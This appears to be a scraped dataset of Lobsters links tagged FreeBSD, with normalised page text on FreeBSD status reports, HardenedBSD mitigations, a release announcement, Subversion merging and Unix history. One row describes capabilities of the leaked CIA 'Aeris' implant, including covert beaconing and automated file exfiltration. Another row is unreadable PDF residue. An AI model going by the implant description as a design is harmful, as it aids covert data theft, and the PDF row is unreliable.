crossbuild tool patch bazel workspace file allow tensorflow built using offline thirdparty dependency work needed freebsd port framework allow network access except fetch stage fix build freebsd make tensorflow build either python python update latest version tensorflow run freebsd cpuonly mode functional test performed combination freebsd python python port would possible without substantial assistance bapt lwhsu mat koobs thank advice review help nice learned lot freebsd port framework open task review test comment importantly commit port collectionfix opencl gpu acceleration support freebsdport tensorflowserving flexible highperformance serving system machine learning model produced tensorflowset ci tensorflow freebsd give early notice upstream break tensorflow freebsd contact mark linimon linimon freebsdorg analyzing error log port build architecture including log published package build cluster also build analysis marked almost failing port either broken notforonlyfor appropriate intent work make life harder anyone rather fact opposite definition place possible scan poudriere bulk build output ignored port portion particular see quickly port failing build previously finding exact reason build failed needed research portsmon analyzes failure message additionally extremely difficult work several hundred log simply say failed compile failed link forth part effort identify need work bring sufficient port collection support eg bring closer true status facilitate locating pattern poudriere output begun reworking existing brokennotforonlyfor message sort easily includes sorting order architecture appear list many people great work fixing individual port hope work make job somewhat easier contact freebsd xfce team xfce freebsdorg contact olivier duchateau duchateauolivier gmailcom xfce free software desktop environment unix unixlike platform freebsd aim fast lightweight still visually appealing easy use quarter kept application uptodate sysutilsgarcon mkusesxfcemk created new subversion tag order follow unstable release separate tag necessary order support change usesxfce infrastucture due incompatible change xfconf api port following unstable release open task make transition smoother end user contact michael lucas mwlucas michaelwlucascom working third edition absolute freebsd nearly complete rewrite thanks addition little detail like zfs gpt dma geli new boot procedure disk labeling pkg blacklistd jail etc current delusional plan first draft finished end october print copy bsdcan open task write remaining book contact warren block wblock freebsdorg retrospect freebsd string source file kind weird like vestigial tail version control system store information metadata yet allowing version control system alter source file every commit forcing reason previous version control system really version control string headache translator using new po toolchain everchanging string offer nothing translation yet cause conflict earlier version also complaint handbook always month date course looking version string main rarelychanging bookxml file gave impression fixed problem last year build system check source file latest commit seems easier fix problem course really one aspect ongoing problem documentation build system checking version string source file metadata metadata like car composed chiefly rust yet invented modified build system extract information metadata noted surprise task git much better subversion next step remove freebsd string source file remove freebsd h property force subversion better judgement substitute text actual content file version information lost life metadata retrieving simple svn info need source however anything touch code process touched living memory debate point offered remove version string freebsd documentation project primer book test change allowed zhtw translation team turn freebsd h property translation continue work without fighting version string rendered version book still display name last committer date revision number last commit information come metadata also likely correct since change complaint least fairness removal version string fdp primer alone small change tiny corner project looking another way might thing seem necessary comfort familiarity actual utility present strictly change documentation build toolchain single documentation book however appear reason could extended rest document might even serve tiny test whether expansion freebsd tag needed throughout rest freebsd tree contact benedict reuschling bcr freebsdorg freebsd support xen hypervisor domu guest support since freebsd host available since freebsd freebsd handbook lacking instruction run xen host vms step outlined freebsd wiki needed extra bit text upstream xen wiki order form complete guide new handbook section briefly explains xen differs hypervisors feature currently available freebsd go describe set well detailing guest vm support known domu reviewer nikolai lifanov roger pau monné warren block provided valuable feedback initial version phabricator additional correction made björn heidotting translating section german open task option domu could providedpeople test instruction hardware provide feedback would also help u get better testing xen port freebsd contact mathieu kerjouan contact steepatheu two meetups dedicated bsd system held rennes france first one hosted ovh office rennes included presentation multiple subject nontechnical history freenas presented olivier ovh using zfs introduction jail use case bgpbird freebsd second meetup also hosted ovh office presented subject create freebsd port presented jadawin ovh using finite state machine managing storage system network highavailability freebsd jail tutorial mean demonstration running ospf using netbird router using jail vnets small pc engine system cpu core amd ram project sponsored ovhmany project build upon freebsd incorporate component freebsd project project may interest broader freebsd community sometimes include brief update submitted project quarterly report freebsd project make representation accuracy veracity claim submission contact shawn webb shawnwebb hardenedbsdorg contact oliver pinter oliverpinter hardenedbsdorg hardenedbsd derivative freebsd give special attention securityrelated enhancement exploitmitigation technology initial focus address space layout randomization aslr branched explore additional exploit mitigation technique long since hardenedbsd last entry quarterly status report back intervening year saw hardenedbsd gain new developer bernard spil franco fichtner import libressl openntpd base default crypto library ntp client respectively introduce hbsdupdate binary update mechanism base system secadm application got rewrite trusted path execution tpe pie enabled base system well bulk port tree port tree also gained relro bindnow integriforce similar netbsd verified exec veriexec introduced base system well safestack technology protection stackbased buffer overflow developed clangllvm community safestack relies build top address space layout randomization aslr strengthened presence pax noexec certain highprofile port also safestack enabled extremely generous hardware donation inc provided dedicated package building binary update server well development test server march added control flow integrity cfi base system cfi exploit mitigation technique help prevent attacker modifying behavior program jumping undefined arbitrary memory location type technique gaining adoption across industry microsoft implemented variant cfi term control flow guard cfg pax team spent last year perfecting reuse attack protector rap rap complete effective implementation followed clang cfi rap would great addition hardenedbsd however requires toolchain patentpending cfi implemented either perdso basis across dsos process currently former implemented working hard enable crossdso cfi case safestack crossdso cfi requires aslr pax noexec order effective attacker know memory layout application attacker might able craft dataonly attack modifying cfi control data behavior several system control sysctl node tighened limiting write access introducing additional safety check write access kernel module apis received similar treatment hardenedbsd pax segvguard implementation received update make stable performant march hardenedbsd accessible tor hidden service main website binary update package distribution available hidden service maintain version drmnext branch updated graphic support binary update also provided branch hardenedbsd would like thank generously donated time money resource project project sponsored soldierx incopen task port safestack crossdso cfiadd documentation hardenedbsd handbookstart porting grsecurity rbacnews home status home
439,Lobsters,freebsd,FreeBSD,My BSD sucks less than yours,https://www.lphp.org/pub/events/my_bsd_sucks_less_than_yours-full_paper.pdf,bsd suck le,,obj linearized l h e n endobj obj type xref length filter flatedecode decodeparms column predictor w index info r root r size prev id stream b c endstream endobj obj page r type catalog endobj obj filter flatedecode length stream b nf f
441,Lobsters,freebsd,FreeBSD,The way Tor currently does sandboxing is completely incompatible with FreeBSD Capsicum,https://mastodon.social/@lattera/17869728,way tor currently sandboxing completely incompatible freebsd capsicum,,essentially least two enable preopening fds sandbox initialization nt know handle socket yet every time tor try open resource funnel attempt new sandboxing abstraction layerthere could one day researchthis diff submitting upstream going yuge going feel sorry whoever code review
442,Lobsters,freebsd,FreeBSD,About the Ravenports Universal Package System,http://ravenports.ironwolf.systems/,ravenports universal package system,bug security vulnerability report http githubcomjrmarinoravensourceissues submission patch new port http githubcomjrmarinoravensourcepulls port adoption ravenporter guide binary package repository generation,every leg ravenports triad consists free opensource software fo released permissive internet system consortium isc license contribution welcome may appear many form bug security vulnerability report future may host dedicated issue tracking system time github issue tracking system available user report bug security issue may known addressed yet report http githubcomjrmarinoravensourceissues submission patch new port future submission patch new port done dedicated interface put submission build queue test build affected port supported platform automatically build test pas automated tested submission forward human inspection inclusion however yet patch must build tested locally pas testing best approach submit contribution github pull request http githubcomjrmarinoravensourcepulls process submitted entirely new port one additional requirement person creates submits port agrees listed maintainer least month expected submitter fully test new port least one platform pull request description new port provide follow information synopsis functionality new port provides software impact approving port inclusion optionally type user likely benefit inclusion platform port tested port adoption port may one maintainer port listed maintainer generated script benefit specific person team people responsible maintenance update port ideally maintainer regular user software help porting error detected quickly also allows quick confirmation reported bug real user motivated fix bug keep latest software upgrade volunteering primary maintainer port expected familiar ravenporter guide technical skill necessary basic port maintenance troubleshooting also expected handle bug report natural conclusion multiple maintainer listed port expected communicate internally speak others bug tracker etc request adopt port made either github bug tracker submitted change via github pull request latter method preferred binary package repository generation contribution form somebody wish extend ravenports support lesserused platform architecture new platform support requires contributor necessary hardware accomplish system root toolchain bootstrapping additionally contributor expected build complete set binary package upload regular interval likely require perplatform adjustment existing incoming port trivial contribution serious contribution welcome vetting ascertain skill level commitment level person team offering extend ravenports noncommercial support use
443,Lobsters,freebsd,FreeBSD,(r)vmadm - managing FreeBSD jails,https://blog.project-fifo.net/rvmadm-managing-freebsd-jails/,r vmadm managing freebsd jail,another tool manage jail communitydriven list datasets whats next announced earlier year gitlab,releasing first version clone vmadm freebsd jail today done feature complete provides basic functionality point think would helpful get get feedback today allows basic management datasets well creating starting stopping destroying jail another tool manage jail however go detail let talk build yet another jail manager frequent nih syndrome actually quite opposite fifo experimented iocage way control jail iocage useful tool used cli utility issue used programmatically managing jail automatically via cli tool thing like performance machine parsable interface matter cli acceptable call take second two automatically consuming tool delay problematic another reason decision vmadm excellent tool well designed smartos us vmadm year given opted adopting proven interface rather trying create new one since already interface smartos reuse majority management code smartos freebsdbsd today manage datasets jail template form zfs volume list serve datasetserver fetch like want point provide datasets freebsd likely list grow idea communitydriven list datasets exist smartos today moreover datasets work hope see bsd jail fetching dataset define jail using json file file compatible zone description used smartos provide feature subset resource cpu memory defined networking configured dataset selected necessary setting like hostname set jail created vmadm allows managing lifetime starting stopping accessing console finally destroying update jail supported however today taken account restarting jail however large part technical impossibility rather high todo list worth mentioning vmadm pick jail created tool manually using vmadm created jail conscious decision prevent interfering existing setup utility conventional tool manage jail set vmadm fine use special trick like nested jail allow restriction required multitenancy hard impossible achieve otherwise whats next first foremost hope get feedback perhaps community engagement meantime announced earlier year hard work integrating freebsd hypervisors fifo writing core action work quite well right barebone function supported output clear would like hope eventually add support behyve vmadm way support kvm smartos moreover groundwork already exists nested jail technique using exploring way allow pci pas jail something possible smartos zone right would beneficial user general want improve compatibility smartos much possible feature add time make specification invalid smartos get tool gitlab
445,Lobsters,freebsd,FreeBSD,Nintendo Being Sued by Gamevice Over Alleged Patent Violation by Switch Controllers,http://www.dualshockers.com/nintendo-sued-gamevice-alleged-patent-violation-switch-controllers/,nintendo sued gamevice alleged patent violation switch controller,,nintendo sued gamevice alleged patent violation switch controller august est nintendo sued mobile gaming accessory maker gamevice alleged infringement company patent nintendo sued u mobile gaming accessory company claiming controller nintendo switch console infringe patent owns gamevice make video game controller attach smartphones tablet demanding nintendo stop making selling switch want paid damage company say filing complaint california nintendo infringement caused continuing cause damage irreparable injury gamevice lawsuit filed gamevice claim design switch us two joycon controller slide onto actual switch unit allow portable gaming infringes least one many patent company owns one company product called gamevice work similar way joycons using two controller attach detach android apple device gamevice allows player control video game using joystick button similar traditional gaming experience rather using device touchscreen gamevice created name wikipad cofounded current ceo oculus vr brendan iribe granted patent united state patent trademark office september around year switch first revealed market gamevice claim nintendo either directly indirectly infringed patent complaint filed court issue summons defendant case nintendo subsidiary nintendo america complaint say much damage would worth august est
448,Lobsters,freebsd,FreeBSD,@jack: You’re all wrong. FreeBSD rules them all!,https://twitter.com/jack/status/892605692317650944,jack wrong freebsd rule,,detected javascript disabled browser would like proceed legacy twitter yes
449,Lobsters,freebsd,FreeBSD,SysAdmin Day | System Administrator Appreciation Day,http://sysadminday.com/,sysadmin day system administrator appreciation day,system administrator appreciation day july annual happy sysadmin day gift gift show appreciation day friday share photo facebook flickr reddit twitter sysadminday http facebookcomsysadmindayholiday,system administrator appreciation dayjuly annual network secure computer running printer jamfree got awesome sysadmin maybe whole department keeping business running say loud say proud happy sysadmin day exactly sysadmin day oh single greatest hour pretty much important holiday year also perfect opportunity pay tribute heroic men woman come rain shine prevent disaster keep secure put tech fire left right point may thinking great get sysadmin rock star glad asked proper observation sysadmin day includes limited cake ice cream pizza card gift word gratitude custom tshirts celebrating epic greatness sysadmin balloon confetti say gift show appreciation friday july annual system administrator appreciation day special international day give system administrator something show truly appreciate hard work dedication day friday hour local timezone let face system administrator get respect day year day fellow system administrator across globe showered expensive sport car large pile cash appreciation diligent work seriously asking nice token gift public acknowledgement least could consider daunting task long hour weekend let honest sometimes know system administrator well know u remember one day recognize system administrator workplace contribution promote professional excellence thank thing business share photo please share sysadmin day celebration photo post photo facebook flickr reddit twitter preferred social medium always use tag sysadminday official facebook page http facebookcomsysadmindayholiday post sysadmin day party invite event post sysadmin day photo check offer friend keeper security
450,Lobsters,freebsd,FreeBSD,"Details Leaked on CIA's ""Aeris"" Implant for Debian, RHEL, CentOS, Solaris, and FreeBSD",https://wikileaks.org/vault7/document/Aeris-UsersGuide/page-1/,detail leaked cia aeris implant debian rhel centos solaris freebsd,,aeris user guidedescriptionaeris automated implant written c support number posixbased systemsplatform supportdebian linux debian linux debian linux arm red hat enterprise linux red hat enterprise linux solaris solaris sparc freebsd freebsd centos centos featuresconfigurable beacon interval standalone collidebased http lp smtp protocol tl encrypted communication mutual authentication appendix c compatibility nod cryptographic specification appendix c structured command control similar used several windowsimplant section iv automated file exfiltration section iv simple flexible deployment installation section iii distributionthe aeris distribution consists set python utility together set ofbinaries one binary per platform listed section binary callunpatched binary fully functional deployable containconfiguration information instead contain placeholder guids static buffer overwritten appropriate information build time aeris buildergenerates valid configuration based user input us configuration create adeployable aeris instanceaeris includes following file aeris pythonscript bin unpatched cgiagntc http cgi lp source cgiagntcgi statically compiled http cgi doc builderpy script build new secretnoforn
452,Lobsters,freebsd,FreeBSD,FreeBSD 11.1-RELEASE Now Available,https://lists.freebsd.org/pipermail/freebsd-announce/2017-July/001798.html,freebsd available,freebsdannounce freebsd available gjb freebsdorg http http http wwwfreebsdorgreleng http http http wwwfreebsdmallcom http http taboverview http http http http wwwfreebsdorgsecurity gjb freebsdorg kib freebsdorg bdrewery freebsdorg blackend freebsdorg rgrimes freebsdorg delphij freebsdorg remko freebsdorg hr freebsdorg glebius freebsdorg marius freebsdorg rwatson freebsdorg http wwwfreebsdfoundationorgdonate information freebsdannounce mailing list,freebsdannounce freebsd available glen barber gjb freebsdorg wed jul utc begin pgp signed message hash freebsd announcement freebsd release engineering team pleased announce availability freebsd second release branch highlight clang llvm lld lldb libc updated version many thirdparty contributed software update elf tool chain acpica libarchive ntpd unbound support blacklistd added openssh zfsbootcfg utility added providing onetime bootconfig style option zfsboot efivar utility added providing interface manage uefi variable support microsoft r hyperv tm generation virtual machine added ena driver added providing support next generation enhanced networking amazon r tm platform nfs client support amazon r elastic file system tm efs efi loader access remote file via tftp addition nfs runtime configuration option zfs store compressed data cache improving cache hit rate performance several update provide build reproducibility complete list new feature known problem please see online release note erratum list available http http information freebsd release engineering activity please see http wwwfreebsdorgreleng availability freebsd available powerpc architecture freebsd installed bootable iso image network architecture also support installing usb memory stick required file downloaded described section hash release iso memory stick sd card image included bottom message pgpsigned checksum release image also available http pgpsigned version announcement available http note upgrading virtualbox tm system panic experienced upgrading emulatorsvirtualboxoseadditions port built locally resolution port either need rebuilt upgrading reinstall package pkg mirror using either pkg install f virtualboxoseadditions pkg install f ensure system panic rebooting updated kernel recommended disable vboxguest service rcconf prior rebooting system possible use pkg forcefully reinstall package system upgraded earlier unaffected purpose image provided part release follows contains everything necessary install base freebsd operating system documentation debugging distribution set small set prebuilt package aimed getting graphical workstation running also support booting livefs based rescue mode need burn use dvdsized medium contains base freebsd operating system also support booting livefs based rescue mode prebuilt package bootonly support booting machine using cdrom drive contain installation distribution set installing freebsd cd would need perform network based install eg http ftp server booting cd memstick written usb memory stick flash drive used install machine capable booting usb drive also support booting livefs based rescue mode prebuilt package one example use memstick image assuming usb drive appears machine something like work dd convsync careful make sure get target correct minimemstick written usb memory stick flash drive used boot machine contain installation distribution set medium similar bootonly image also support booting livefs based rescue mode prebuilt package one example use minimemstick image assuming usb drive appears machine something like work dd convsync careful make sure get target correct freebsdarm sd card image written sd card used boot supported arm system sd card image contains full freebsd installation installed onto sd card small convenience without console access system freebsd user password freebsd available default ssh access additionally root user password set root strongly recommended change password user gaining access system write freebsdarm image sd card use dd utility replacing kernel appropriate kernel configuration name system dd convsync careful make sure get target correct freebsd also purchased cdrom dvd several vendor one vendor offering freebsd product freebsd mall inc http wwwfreebsdmallcom preinstalled virtual machine image also available architecture vhd vmdk disk image format well raw unformatted image freebsd also available cloud hosting platform amazon r tm amis available following region region region region region region region region region region region region region region region amis also available amazon r marketplace completed thirdparty specific validation http google r compute engine tm instance deployed using gcloud utility gcloud compute instance create instance image imageprojectfreebsdorgclouddev gcloud compute ssh instance replace instance name google compute engine instance hashicorpatlas r vagrant tm instance deployed using vagrant utility vagrant init vagrant microsoft r azure tm freebsd virtual machine image available completed thirdparty specific validation http taboverview download freebsd may downloaded via http following site http freebsd virtual machine image may downloaded http instruction installing freebsd updating existing machine please see http support based new freebsd support model freebsd release series supported least september point release freebsd supported least three month freebsd additional support information found http wwwfreebsdorgsecurity acknowledgment many company donated equipment network access manhours support release engineering activity freebsd including freebsd foundation yahoo netapp internet system consortium bytemark hosting sentex communication new york internet juniper network nlnet lab ixsystems yandex release engineering team includes glen barber gjb freebsdorg release engineering lead release engineer konstantin belousov kib freebsdorg release engineering bryan drewery bdrewery freebsdorg release engineering package building marc fonvieille blackend freebsdorg release engineering documentation rodney grime rgrimes freebsdorg release engineering emeritus xin li delphij freebsdorg release engineering security officer remko lodder remko freebsdorg security team liaison hiroki sato hr freebsdorg release engineering documentation gleb smirnoff glebius freebsdorg release engineering security officer deputy marius strobl marius freebsdorg release engineering deputy lead robert watson rwatson freebsdorg release engineering trademark freebsd registered trademark freebsd foundation iso image checksum powerpc bananapi beaglebone cubieboard cuboxhummingboard gumstix rpib pandaboard wandboard virtual machine disk image checksum love freebsd support future release donation freebsd foundation http wwwfreebsdfoundationorgdonate begin pgp signature end pgp signature information freebsdannounce mailing list
453,Lobsters,freebsd,FreeBSD,Review of FreeBSD's Subversion primer,https://svn.haxx.se/users/archive-2017-07/0082.shtml,review freebsd subversion primer,http wwwfreebsdorgdocenarticlescommittersguidesubversionprimerhtml http sparsedirectoryexclusion http reposdictatedconfig http svndiff http filemergetool http wwwopencollabnetcommunitysubversionarticlesmergeinfohtml http blogscollabnetsubversionwheredidthatmergeinfocomefrom http customkeywords http subversionapacheorgcontributinghtml code http,fri jul xin li wrote hi stefan thanks feedback please see response inline fri jul stefan sperling stspatapacheorg wrote thu jul xin li wrote freebsd repository one best real world data set available subversion developer referred several time working new conflict resolver planned subversion spent day running test merges repository repository show many difficult interesting problem would normally see repository locked inside company problem seen due limitation svn believe problem freebsd developer svn selfmade freebsd developer general really understand tool nt know work arounds weakness freebsd handbook section subversion full bad advice halftruths guess mean article http wwwfreebsdorgdocenarticlescommittersguidesubversionprimerhtml yes could please specific bad advice would helpful could fixed document andor practice possible take look premier get issue raised eurobsdcon tutorial addressed sure go point thing stand positively negatively information contained guide simply outdated checkout note decreasing depth working copy possible long outdated advice see depthexclude option introduced http sparsedirectoryexclusion adding removing file adding file get copy autopropstxt longer necessary since subversion use svn autoprops instead http reposdictatedconfig diffs probably mention old new syntax used compare arbitrary file directory local andor repository including unversioned item syntax described svn help diff worth pointing anyway http svndiff conflict list possible value accept option incomplete mention svn help always uptodate list prominently mentioned minefull theirsfull option rarely needed time using edit command e conflict prompt best path forward case eg file use linebyline syntax merge command provides useful merge tool inspired openbsd version sdiff http filemergetool sparse checkout list depth option argument incomplete lack exclude direct operation certain operation performed directly repository without touching working copy merge wrong merge modifies working copy unless dryrun used merging svn merge tracking set file mergeinfo applies file set directory applies directory descendant file directory except svn mergeinfo part entire section correct inherited instance implicitly inherit mergeinfo claim true svn mergeinfo otherwise wrong remaining explanation provided wo nt quote mergeinfo inheritance work vastly oversimplified lead misunderstanding false conclusion would delete instead refer interested reader article paul burba cover subject depth http wwwopencollabnetcommunitysubversionarticlesmergeinfohtml http blogscollabnetsubversionwheredidthatmergeinfocomefrom aside would great content article copied svnbook provided paul grant permission selecting source target newer merges merged committed root branch good however guide also encourage local experimentation various merge trick path come resolving tree conflict often help think directory repository entire branch starting merge also help think subversion repository really collection revision path ancestral relationship modelled via copy resolving tree conflict right level abstraction use selecting source target older earlier different strategy used distributing mergeinfo around tree merges could performed without complete checkout procedure proved extremely errorprone convenience partial checkout merges significantly outweighed complexity picking mergeinfo target procedure describes nowobsoleted process kidding say happy process already changed never merge directly file never ever merge directly file never ever ever merge directly file apparently written someone got burned mergetracking bug lack good tree conflict handling nt ask expert help resorted warning everyone stay away ever trying admit found attitude towards function tool use probably nt understand well correct answer depends shown eurobsdcon tutorial may make sense merge directly file resolving tree conflict preparing merge target important never merge change sparse working copy yes read paul burba article see committing make sure commit top level directory mergeinfo included well good essential advice flattening propdel bit necessary starting subversion automatically add svn mergeinfo directory copied moved longer true workingcopy workingcopy copy create mergeinfo importing vendor tree svn add svn rm command used needed make sense use svn move instead svn rm followed svn add vendor moved file become useful subversion merging head alias repository path url shortcut mentioned prominently much earlier eg section fixing mistake thing repository journal mentioned would suggest replace repository journal repository tip possible automatically fill sponsored mfc commit log field setting freebsdsponsoredby freebsdmfcafter field miscellany section subversionconfig configuration file example freebsdsponsoredby freebsd foundation freebsdmfcafter week wish freebsd putting effort getting custom feature integrated stock subversion managed get freebsd custom keywords patch integrated http customkeywords rest see http subversionapacheorgcontributinghtml code eurobsdcon offered special svn tutorial freebsd developer many participant nobody freebsd developer clear lack interest kind communication tutorial nt go planned interesting conversation happened still find tutorial one bad merges discussed believe http nt knew tutorial thanks taking time analysis sharing understood correctly vendor import file renames addition svn mv vendor tree quick question semiautomated way developer also handle merge conflict differently development trunk replaying merges svn revert old file restore file merge state svn rm new file remove new file preparation actual merge svn mv old file new file move old file new location svn merge accept postpone vendor old file vendor commit vendor new file vendor commit new file svn propdel svn mergeinfo new file need similar change merging stable perhaps looked specific example nt know widely generalized competent developer able decide goal writing tutorial encourage experimentation solution go beyond running svn merge hoping best requires understanding subversion beyond freebsd handbook provide given high standard freebsd set developer matter nt see problem understanding correctly benefit new file get change history line development trunk instead continue vendor history also avoided missing change happen development trunk vendor area development trunk yes seems natural linear history trunk people vendor import deal vendor branch people never see svn log output go one problem solution merge like indeed need scripted subversion unable match path lot command need run unfortunate improve time subversion another huge step forward however think using scripting perform complex merges healthy attitude nice tool developer using merge nt work automatically try script merge run automatically starting clean working copy trial error find best path forward given situation happy run final script svn commit command appended end release soon encourage try tutorial version let u know think cheer stefan received cest
454,Lobsters,freebsd,FreeBSD,Re-Writing BSD 4.4 Shell Commands: mkdir,https://www.youtube.com/watch?v=t96qYd4OUBM,rewriting bsd shell command mkdir,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature rewriting bsd shell command mkdir youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature rewriting bsd shell command mkdir youtube
455,Lobsters,freebsd,FreeBSD,"OSHUG Event #59 - CHERI CPU, Adding Security to Compilers, Trust & Provenance in Open Data",http://oshug.org/event/59,oshug event cheri cpu adding security compiler trust provenance open data,trust provenance open data govuk foreign commonwealth office country register michaela benyohai andy bennett adding security compiler paolo savini cheri cpu hardwaresoftware codesign security david chisnall note please aim arrive event start prompt,brief hiatus return month evening talk topic trust provenance open data gd adding security compiler lada project secure project extending risc isa add capability enhancement improved security cheri project trust provenance open data govuk register authoratitive list open data trust register reliable list kind example foreign commonwealth office country register accurate uptodate list country available talk michaela andy explain government digital service designed register use combination social cryptographic technique process order make register trusted verifiable secure michaela benyohai graduated degree engineering mathematics spent year royal bank scotland building low latency aggregation engine uis keen new challenge excited meaningful project government technology moved government digital service early currently leading gd work register hoping transform way government share access data andy bennett graduating imperial college degree electronic electrical engineering joined access device digital limited designed software fpgas uk first dual tuner personal video recorder continued working advanced product development pace micro technology leaving build distributed database engine geniedb founded knodium applied finely honed ability produce software shoestring andy technologist like inhabit void hardware software run spare time like embark ambitious project scratch prototyping design handheld computer digital watch bluetooth headset currently building two wheeled actively balanced robot adding security compiler information leakage via side channel widely recognised threat cyber security particular small device known leak information physical channel ie power consumption electromagnetic radiation timing behaviour serveral implementation technique countermeasure arising nowadays kind threaths still fully equipped testing lab skilled people afford test new implementation leakage attack focus information leakage due timing behaviour possibility cachebased timing attack discus work context two project lada project secure project aim bringing skill testing lab desk developer standard consumer device without need domain specific knowledge development open source compiler paolo savini intern compiler engineer embecosm ltd working secure project helping bring next generation secure programming technique open source compiler prior joining embecosm cooperated lada project university bristol order explore possility creating compiler tool help improve implementation cryptography paolo currently graduating university pavia italy achieved bachelor degree electronic computer engineering cheri cpu hardwaresoftware codesign security talk introduce cheri cpu associated cc compiler stack various design decision project made based need programming language support realworld code requirement hardware implementation c specification intentionally vague would easy create conforming implementation language requirement c environment good code run cheri project investigated number common c idiom ensured supported hardware simultaneously allowing finegrained memory safety coarsergrained compartmentalisation c program david chisnall senior research associate university cambridge primary research interest safe interoperability programming language recently working context cheri project creating implementation c programming language used safely process language stricter safety guarantee presented case study allowing java c code coexist process without violating jvm safety security guarantee asplos earlier year david active open source contributor llvm committer since member freebsd core team two successive term author maintainer widely deployed objectivec c runtime library note please aim arrive event start prompt
456,Lobsters,freebsd,FreeBSD,EuroBSDcon 2017 Registration is open,https://registration.eurobsdcon.org/,eurobsdcon registration open,javascript enabled,javascript enabled osem requires javascript enabled function please turn javascript browser setting reload page continue
458,Lobsters,freebsd,FreeBSD,“Absolute FreeBSD 3rd Edition” update,https://blather.michaelwlucas.com/archives/2972,absolute freebsd edition update,absolute freebsd butterfly waltz stomp eurobsdcon,like third edition absolute freebsd print may bsdcan discussion starch press make happen must complete first draft november four month complicate thing four month four week traveling bsdcam eurobsdcon writing business workshop three month best guess write word week make happen call word working day nonfiction cruising speed word hour roughly hour week six hour day provided nothing go wrong maintain nonfiction speed write fiction well without nonfiction speed drop wordshour keep minute day terrapin sky tango sequel butterfly waltz stomp hour day plus business run assemble core concept zfs tutorial eurobsdcon europe want see chance time need spend night week martial art practice upshot see around much november good news done hardest part first squeeze time weekend evening get ahead book stalk social medium
459,Lobsters,freebsd,FreeBSD,"FreeBSD deprecates all r-cmds (rlogin, etc)",http://marc.info/?l=freebsd-commits-all&m=149918307723723&w=2,freebsd deprecates rcmds rlogin etc,prev list next list next thread freebsdcommitsall svn commit head binrcp libexecrlogind libexecrshd usrbinrlogin usrbinrsh usrb allan jude allanjude freebsd org repo freebsd org message body http http http listsfreebsdorgmailmanlistinfosvnsrcall prev list next list next thread configure news add list korelogic,prev list next list prev thread next thread list freebsdcommitsall subject svn commit head binrcp libexecrlogind libexecrshd usrbinrlogin usrbinrsh usrb allan jude allanjude freebsd org date messageid repo freebsd org download raw message body author allanjude date tue jul new revision url http log add deprecation notice rcmd tool submitted bcr reviewed emaste bapt jhl mfc immediate relnotes yes differential revision http modified modified tue jul tue jul berkeley freebsd dd october dd july dt rcp o sh name op fl ar ar directory sh deprecation notice nm deprecated removed future version fx base system nm still required installed port package netbsdrcmds sh description nm modified tue jul tue jul berkeley freebsd dd february dd july dt rlogind o sh name sh synopsis nm op fl daln sh deprecation notice nm deprecated removed future version fx base system nm still required installed port package netbsdrcmds sh description nm modified tue jul tue jul berkeley freebsd dd june dd july dt rshd o sh name sh synopsis nm op fl adlln sh deprecation notice nm deprecated removed future version fx base system nm still required installed port package netbsdrcmds sh description nm modified tue jul tue jul berkeley freebsd dd september dd july dt rlogin o sh name op fl ar localname op fl l ar username ar host sh deprecation notice nm deprecated removed future version fx base system nm still required installed port package netbsdrcmds sh description nm modified tue jul tue jul berkeley freebsd dd october dd july dt rsh o sh name op fl ar timeout ar host op command sh deprecation notice nm deprecated removed future version fx base system nm still required installed port package netbsdrcmds sh description nm modified tue jul tue jul berkeley freebsd dd march dd july dt ruptime o sh name nm op fl alrtu op ar host sh deprecation notice nm deprecated removed future version fx base system nm still required installed port package netbsdrcmds sh description nm modified tue jul tue jul berkeley freebsd dd june dd july dt rwho o sh name sh synopsis nm op fl sh deprecation notice nm deprecated removed future version fx base system nm still required installed port package netbsdrcmds sh description nm modified tue jul tue jul berkeley freebsd dd january dd july dt rwhod o sh name op fl p op fl l op fl op ar ttl sh deprecation notice nm deprecated removed future version fx base system nm still required installed port package netbsdrcmds sh description nm svnsrcall freebsdorg mailing list http listsfreebsdorgmailmanlistinfosvnsrcall unsubscribe send mail svnsrcallunsubscribe freebsdorg prev list next list prev thread next thread configure news add list sponsored korelogic
460,Lobsters,freebsd,FreeBSD,johalun/echo: FreeBSD kernel module in Rust,https://github.com/johalun/echo,johalunecho freebsd kernel module rust,echo freebsd kernel module written rust wip requirement installation http wwwrustuprs content root folder crate libstdunicode libcollections liballoc liballocsystem freebsdkernelstd build load module usage warning,echo freebsd kernel module written rust wip requirement freebsd machine rust nightly xargo recommend using rustup installing handling different version rust installation rust see http wwwrustuprs xargo setting rust nightly crate root rustup override set nightly content root folder folder cargo root module crate dependency crate available cratesio core built handled completely xargo libstdunicode copied rust source code unmodified libcollections copied rust source code unmodified liballoc copied rust source code unmodified liballocsystem copied rust source code added kernmallocrs ffi binding kernel malloc function modified librs use said function freebsdkernelstd minimal implementation std echo module ffi binding generated build safe binding exists thing necessary code run build check buildsh script like make change run load module build successful helloko file root folder load sudo kldload helloko usage cat devrustmodule default message echo hello devrustmodule read byte setting new message hellon cat devrustmodule hello sudo kldunload hello warning bug faulty code kernel likely hang recommend testing module virtual machine keep system safe make easier develop test
461,Lobsters,freebsd,FreeBSD,Assembling the history of Unix,https://lwn.net/Articles/725297/,assembling history unix,subscribing lwn unix heritage society browse instant github unix heritage society renamed unix heritage society edition unix history repository github researched primary source granted permission log,benefit lwn subscribersthe primary benefit subscribing lwn helping keep u publishing beyond subscriber get immediate access site content access number extra site feature please sign today june article contributed jesse jiryu davis moment antique operating system run decade boot present command prompt thrilling warren toomey compare restoring old modelt old car look pretty end day purpose drive somewhere love able turn engine actually get job toomey australian university lecturer founded unix heritage society reconstruct early history unix operating system recently historical code become much accessible browse instant github thanks effort computer science professor athens university economics business named diomidis spinellis anniversary invention unix painstaking work toomey spinellis make possible u appreciate unix epic story unix heritage society around researcher university new south wale toomey began asking mailing list news group old unix version intent run simulator began group called unix preservation society whose mission grew encompass old unix release renamed unix heritage society think title bit grandiose said interview lwn really society mailing list toomey project faced two obstacle first simply locate enough part old unix version assemble complete copy haunted newsgroups mailing list old unix hacker heard rumor people knew get historical artifact request went unanswered recall spending five six year repeatedly asking specific file eventually someone would respond oh actually chance toomey discovered university computer room dozen tape backup edition unix backup nt nt even complete backup either discovery accelerated project nevertheless second obstacle long shadow original copyright corporation allowed individual copy unix share toomey found university copy system v source license provided small bit legal cover ask stranger share vintage file occasionally one toomey inside informant might give copy file saying nt tell anyone got whenever toomey acquired seemed complete version unix get running without documentation guide got artifact said might binary source code makefile got idea right sequence thing build last year example toomey friend unix heritage society resuscitated first version unix written primary source dotmatrix printout containing assembly code badly printed note correction scribbled member society converted blurred copy digital text 